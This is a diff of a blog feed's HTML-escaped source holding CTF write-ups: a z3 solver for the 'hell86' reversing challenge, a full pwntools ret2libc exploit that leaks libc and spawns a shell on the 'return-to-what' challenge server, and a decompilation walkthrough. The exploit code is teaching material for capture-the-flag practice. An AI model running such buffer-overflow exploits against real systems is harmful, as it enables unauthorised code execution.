 &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">17576&lt;/span>, &lt;span style="color:#ae81ff">19683&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">32768&lt;/span>, &lt;span style="color:#ae81ff">729&lt;/span>, &lt;span style="color:#ae81ff">19683&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">729&lt;/span>, &lt;span style="color:#ae81ff">1000&lt;/span>, &lt;span style="color:#ae81ff">125&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#ae81ff">512&lt;/span>, &lt;span style="color:#ae81ff">512&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">6859&lt;/span>, &lt;span style="color:#ae81ff">8000&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>
 ]
-x &lt;span style="color:#f92672">=&lt;/span> [BitVec(f&lt;span style="color:#e6db74">&amp;#39;x[{i}]&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">30&lt;/span>)] &lt;span style="color:#75715e"># 30 char of input&lt;/span>
+x &lt;span style="color:#f92672">=&lt;/span> [BitVec(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;x[&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>i&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#ae81ff">16&lt;/span>) &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">30&lt;/span>)] &lt;span style="color:#75715e"># 30 char of input&lt;/span>
 s &lt;span style="color:#f92672">=&lt;/span> Solver()
 s&lt;span style="color:#f92672">.&lt;/span>add(x[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">22&lt;/span>) &lt;span style="color:#75715e"># first char = x&lt;/span>
 indices &lt;span style="color:#f92672">=&lt;/span> []
@@ -507,10 +507,10 @@ m &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&l
 &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">30&lt;/span>):
 obj &lt;span style="color:#f92672">=&lt;/span> x[i]
 flag &lt;span style="color:#f92672">+=&lt;/span> characters[m[obj]&lt;span style="color:#f92672">.&lt;/span>as_long()]
-&lt;span style="color:#66d9ef">print&lt;/span>(s&lt;span style="color:#f92672">.&lt;/span>assertions())
-&lt;span style="color:#66d9ef">print&lt;/span>(f&lt;span style="color:#e6db74">&amp;#34;FLAG{{{flag}}}&amp;#34;&lt;/span>)
+print(s&lt;span style="color:#f92672">.&lt;/span>assertions())
+print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;FLAG&lt;/span>&lt;span style="color:#ae81ff">{{&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>flag&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#ae81ff">}}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>And voila when we run the script we get the flag. We&amp;rsquo;ll check it actual binary which should print &lt;code>OK!&lt;/code> if its a valid flag&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> vm&lt;span style="color:#f92672">/&lt;/span>hell86&lt;span style="color:#f92672">/&lt;/span>solve &lt;span style="color:#f92672">./&lt;/span>solve
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> vm&lt;span style="color:#f92672">/&lt;/span>hell86&lt;span style="color:#f92672">/&lt;/span>solve &lt;span style="color:#f92672">./&lt;/span>solve
 FLAG{x86&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>s&lt;span style="color:#f92672">-&lt;/span>s0&lt;span style="color:#f92672">-&lt;/span>fund4m3nt4lly&lt;span style="color:#f92672">-&lt;/span>br0k3n}
 &lt;span style="color:#960050;background-color:#1e0010">▲&lt;/span> vm&lt;span style="color:#f92672">/&lt;/span>hell86&lt;span style="color:#f92672">/&lt;/span>solve &lt;span style="color:#f92672">./&lt;/span>hell86 FLAG{x86&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>s&lt;span style="color:#f92672">-&lt;/span>s0&lt;span style="color:#f92672">-&lt;/span>fund4m3nt4lly&lt;span style="color:#f92672">-&lt;/span>br0k3n}
 OK&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
@@ -519,7 +519,7 @@ OK&lt;span style="color:#960050;background-color:#1e0010">!&lt;/span>
 {} ret2what checksec return-to-what [*] &amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and no canary which makes it easier and ASLR is probably enabled.
 Disassembly and Decompilation pwndbg&amp;gt; disassemble main Dump of assembler code for function main: 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp # prologue 0x00000000004011b1 &amp;lt;+4&amp;gt;: lea rdi,[rip+0xe78] # rdi = address of [rip+0xe78] 0x00000000004011b8 &amp;lt;+11&amp;gt;: call 0x401030 &amp;lt;puts@plt&amp;gt; # call puts function 0x00000000004011bd &amp;lt;+16&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011c2 &amp;lt;+21&amp;gt;: call 0x401185 &amp;lt;vuln&amp;gt; # call vuln function which has the vulnerable gets function which we use to do bof 0x00000000004011c7 &amp;lt;+26&amp;gt;: mov eax,0x0 # eax = 0x0 0x00000000004011cc &amp;lt;+31&amp;gt;: pop rbp # epilogue 0x00000000004011cd &amp;lt;+32&amp;gt;: ret End of assembler dump.</description><content>&lt;h2 id="leaking-libc-addresses-to-do-ret2libc-with-unknown-libc">Leaking Libc addresses to do ret2libc with unknown libc&lt;/h2>
 &lt;p>First lets take a look at the binary mitigations&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> ret2what checksec &lt;span style="color:#66d9ef">return&lt;/span>-to-what
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -529,7 +529,7 @@ PIE: No PIE &lt;span style="color:#f92672">(&lt;/span>0x400000&lt;span style="co
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Nx is enabled so we can&amp;rsquo;t do a bof and place our shellcode to get a shell and
 no canary which makes it easier and ASLR is probably enabled.&lt;/p>
 &lt;h2 id="disassembly-and-decompilation">Disassembly and Decompilation&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">pwndbg&amp;gt; disassemble main
 Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
 0x00000000004011ad &amp;lt;+0&amp;gt;: push rbp
 0x00000000004011ae &amp;lt;+1&amp;gt;: mov rbp,rsp &lt;span style="color:#75715e"># prologue&lt;/span>
@@ -542,7 +542,7 @@ Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span sty
 0x00000000004011cd &amp;lt;+32&amp;gt;: ret
 End of assembler dump.
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The decompilation of the assembly code looks like this&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 undefined8 main&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 puts&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Today, we\&amp;#39;ll have a lesson in returns.&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>;
@@ -550,7 +550,7 @@ vuln&lt;span style="color:#f92672">()&lt;/span>;
 &lt;span style="color:#66d9ef">return&lt;/span> 0;
 &lt;span style="color:#f92672">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>In addition lets take a look at the &lt;code>vuln&lt;/code> function too&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">
 void vuln&lt;span style="color:#f92672">(&lt;/span>void&lt;span style="color:#f92672">)&lt;/span>
 &lt;span style="color:#f92672">{&lt;/span>
 char *s;
@@ -564,11 +564,11 @@ gets&lt;span style="color:#f92672">(&lt;/span>&amp;amp;s&lt;span style="color:#f
 the &lt;code>ret&lt;/code> gadget to align our stack&lt;/p>
 &lt;h2 id="leaking-address-of-libc">Leaking address of Libc&lt;/h2>
 &lt;p>Now lets craft our exploit to leak address of libc and i previously found out the offset to do bof is &lt;code>56&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -582,11 +582,11 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
 io&lt;span style="color:#f92672">.&lt;/span>close()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Here i leaked the address of &lt;code>__libc_start_main &lt;/code>&lt;/p>
 &lt;p>Now lets run our exploit script in order to leak libc address&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
 RELRO: Partial RELRO
@@ -602,12 +602,12 @@ RUNPATH: b&lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Desktop/tmp&amp
 &lt;p>&lt;img src="/images/libc-database.png" alt="">&lt;/p>
 &lt;p>Now that we found out the libc version, here i assumed it to be the first libc so i choose to use &lt;code>libc6_2.27-3ubuntu1_amd64.so&lt;/code>&lt;/p>
 &lt;p>Lets craft our final exploit script and run in on the remote server to get a shell and grab our flag 🚩&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>terminal &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;alacritty&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;sh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-c&amp;#39;&lt;/span>]
 context&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;info&amp;#39;&lt;/span>
-exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
-libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>True)
+exe &lt;span style="color:#f92672">=&lt;/span> context&lt;span style="color:#f92672">.&lt;/span>binary &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./return-to-what&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
+libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>, checksec&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
 io &lt;span style="color:#f92672">=&lt;/span> process(exe&lt;span style="color:#f92672">.&lt;/span>path)
 &lt;span style="color:#75715e">#io = remote(&amp;#39;chal.duc.tf&amp;#39;, 30003)&lt;/span>
 &lt;span style="color:#75715e">#gdb.attach(io)&lt;/span>
@@ -622,12 +622,12 @@ io&lt;span style="color:#f92672">.&lt;/span>recvline()
 recieved &lt;span style="color:#f92672">=&lt;/span> io&lt;span style="color:#f92672">.&lt;/span>recvline()&lt;span style="color:#f92672">.&lt;/span>strip()
 libc_leak &lt;span style="color:#f92672">=&lt;/span> u64(recieved&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\x00&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>))
 libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_leak &lt;span style="color:#f92672">-&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#39;__libc_start_main&amp;#39;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;__libc_start_main leak &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc_leak)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;libc base &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(libc&lt;span style="color:#f92672">.&lt;/span>address)))
 bin_sh &lt;span style="color:#f92672">=&lt;/span> next(libc&lt;span style="color:#f92672">.&lt;/span>search(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>))
 system &lt;span style="color:#f92672">=&lt;/span> libc&lt;span style="color:#f92672">.&lt;/span>sym[&lt;span style="color:#e6db74">&amp;#34;system&amp;#34;&lt;/span>]
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
-log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system {}&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;/bin/sh &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(bin_sh)))
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">&amp;#34;system &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(hex(system)))
 payload &lt;span style="color:#f92672">=&lt;/span> flat([
 cyclic(&lt;span style="color:#ae81ff">56&lt;/span>), ret, pop_rdi, bin_sh, system
 ])
@@ -635,7 +635,7 @@ io&lt;span style="color:#f92672">.&lt;/span>recv()
 io&lt;span style="color:#f92672">.&lt;/span>sendline(payload)
 io&lt;span style="color:#f92672">.&lt;/span>interactive()
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Lets run our exploit as expected we get a shell so we&amp;rsquo;ll cat out the &lt;code>flag&lt;/code> now&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#f92672">{}&lt;/span> python exploit.py
 &lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Opening connection to chal.duc.tf on port 30003: Done
 &lt;span style="color:#f92672">[&lt;/span>*&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#e6db74">&amp;#39;/home/h4x5p4c3/Downloads/ret2what/return-to-what&amp;#39;&lt;/span>
 Arch: amd64-64-little
@@ -670,10 +670,10 @@ Decompilaton And looking at the decompilation we see a string compare statement 
 we can simulate this pretty easy with angr and find the flag&lt;/p>
 &lt;h2 id="decompilaton">Decompilaton&lt;/h2>
 &lt;p>And looking at the decompilation we see a string compare statement which shows the string we&amp;rsquo;re looking for is 16 characters&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">
-undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(int64_t arg7)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">
+undefined4 &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int64_t&lt;/span> arg7)
 {
-int32_t iVar1;
+&lt;span style="color:#66d9ef">int32_t&lt;/span> iVar1;
 undefined auVar2 [&lt;span style="color:#ae81ff">16&lt;/span>];
 undefined auStack56 [&lt;span style="color:#ae81ff">16&lt;/span>];
 undefined auStack40 [&lt;span style="color:#ae81ff">16&lt;/span>];
@@ -682,8 +682,8 @@ undefined auStack40 [&lt;span style="color:#ae81ff">16&lt;/span>];
 __isoc99_scanf(&lt;span style="color:#e6db74">&amp;#34;%15s&amp;#34;&lt;/span>, auStack56);
 auVar2 &lt;span style="color:#f92672">=&lt;/span> pshufb(auStack56, _SHUFFLE);
 auStack40 &lt;span style="color:#f92672">=&lt;/span> CONCAT412(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x60&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ftcg&lt;/span>&lt;span style="color:#ae81ff">\x02\x06\a\x01\x05\v\t\x0e\x03\x0f\x04\b\n\f\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>._0_4_,
-CONCAT48(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(int32_t &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4068&lt;/span>,
-CONCAT44(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(int32_t &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4064&lt;/span>, SUB164(auVar2, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> _ADD32))
+CONCAT48(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x40&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4068&lt;/span>,
+CONCAT44(SUB164(auVar2 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0x20&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">int32_t&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x4064&lt;/span>, SUB164(auVar2, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> _ADD32))
 ) &lt;span style="color:#f92672">^&lt;/span> _XOR;
 iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(SUB168(auStack40, &lt;span style="color:#ae81ff">0&lt;/span>), auStack56, auStack40, &lt;span style="color:#ae81ff">0x10&lt;/span>);
 &lt;span style="color:#66d9ef">if&lt;/span> ((iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> (iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(auStack40, _EXPECTED_PREFIX, &lt;span style="color:#ae81ff">4&lt;/span>), iVar1 &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
@@ -693,10 +693,10 @@ puts(&lt;span style="color:#e6db74">&amp;#34;SUCCESS&amp;#34;&lt;/span>);
 puts(&lt;span style="color:#e6db74">&amp;#34;FAILURE&amp;#34;&lt;/span>);
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
 }
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(SUB168(auStack40, &lt;span style="color:#ae81ff">0&lt;/span>), auStack56, auStack40, &lt;span style="color:#ae81ff">0x10&lt;/span>);
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">iVar1 &lt;span style="color:#f92672">=&lt;/span> strncmp(SUB168(auStack40, &lt;span style="color:#ae81ff">0&lt;/span>), auStack56, auStack40, &lt;span style="color:#ae81ff">0x10&lt;/span>);
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>0x10 which is 16 in decimal and that has a null byte at end so its considered 16 but the exact size is 15&lt;/p>
 &lt;p>Now we lookup for the addresses of the failure string and success string&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">0x00001100 lea rdi, str.FAILURE ; 0x2018 ; const char *s
